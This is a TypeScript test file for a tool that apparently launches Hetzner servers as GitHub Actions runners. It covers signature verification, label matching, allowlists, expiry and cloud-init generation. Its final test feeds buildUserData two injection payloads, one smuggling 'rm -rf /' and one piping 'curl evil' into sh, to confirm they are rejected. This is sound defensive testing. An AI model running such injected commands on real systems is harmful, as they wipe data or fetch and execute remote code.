import assert from 'node:assert/strict';
import { createHmac } from 'node:crypto';
import { test } from 'node:test';
import { buildUserData } from '../src/cloud-init.ts';
import { parseRepos } from '../src/config.ts';
import { labelsMatch, serverNameForJob, verifySignature } from '../src/github.ts';
import { isExpired } from '../src/hetzner.ts';

const SECRET = 'test-secret';
const sign = (body: Buffer) => `sha256=${createHmac('sha256', SECRET).update(body).digest('hex')}`;

test('verifySignature accepts a valid signature', () => {
  const body = Buffer.from('{"action":"queued"}');
  assert.equal(verifySignature(SECRET, body, sign(body)), true);
});

test('verifySignature rejects a tampered body', () => {
  const body = Buffer.from('{"action":"queued"}');
  assert.equal(verifySignature(SECRET, Buffer.from('{"action":"evil"}'), sign(body)), false);
});

test('verifySignature rejects a wrong secret', () => {
  const body = Buffer.from('{}');
  const wrong = `sha256=${createHmac('sha256', 'other').update(body).digest('hex')}`;
  assert.equal(verifySignature(SECRET, body, wrong), false);
});

test('verifySignature rejects missing or malformed headers', () => {
  const body = Buffer.from('{}');
  assert.equal(verifySignature(SECRET, body, undefined), false);
  assert.equal(verifySignature(SECRET, body, 'sha1=abc'), false);
  assert.equal(verifySignature(SECRET, body, 'sha256=short'), false);
});

test('labelsMatch requires every job label to be a runner label', () => {
  const runnerLabels = ['self-hosted', 'hetzner'];
  assert.equal(labelsMatch(['self-hosted', 'hetzner'], runnerLabels), true);
  assert.equal(labelsMatch(['hetzner'], runnerLabels), true);
  assert.equal(labelsMatch(['ubuntu-latest'], runnerLabels), false);
  assert.equal(labelsMatch(['self-hosted', 'gpu'], runnerLabels), false);
  assert.equal(labelsMatch([], runnerLabels), false);
});

test('serverNameForJob is a valid, unique hostname per job', () => {
  assert.equal(serverNameForJob(12345), 'ci-runner-12345');
});

test('parseRepos normalizes and validates the allowlist', () => {
  const repos = parseRepos(' Owner/Repo , other/repo2 ');
  assert.deepEqual([...repos], ['owner/repo', 'other/repo2']);
  assert.throws(() => parseRepos('not-a-repo'));
  assert.throws(() => parseRepos(''));
});

test('isExpired compares server age against the lifetime', () => {
  const now = Date.parse('2026-01-01T12:00:00Z');
  assert.equal(isExpired('2026-01-01T09:00:00Z', 120, now), true);
  assert.equal(isExpired('2026-01-01T11:00:00Z', 120, now), false);
});

test('buildUserData embeds version and JIT config, stays under the size limit', () => {
  const jit = Buffer.from('x'.repeat(3000)).toString('base64');
  const userData = buildUserData('2.335.1', jit);
  assert.ok(userData.startsWith('#cloud-config'));
  assert.ok(userData.includes('actions-runner-linux-x64-2.335.1.tar.gz'));
  assert.ok(userData.includes(`--jitconfig ${jit}`));
  assert.ok(Buffer.byteLength(userData) < 32 * 1024);
});

test('buildUserData rejects unsafe interpolations', () => {
  assert.throws(() => buildUserData('2.335.1; rm -rf /', 'YWJj'));
  assert.throws(() => buildUserData('2.335.1', "abc'; curl evil |sh"));
});
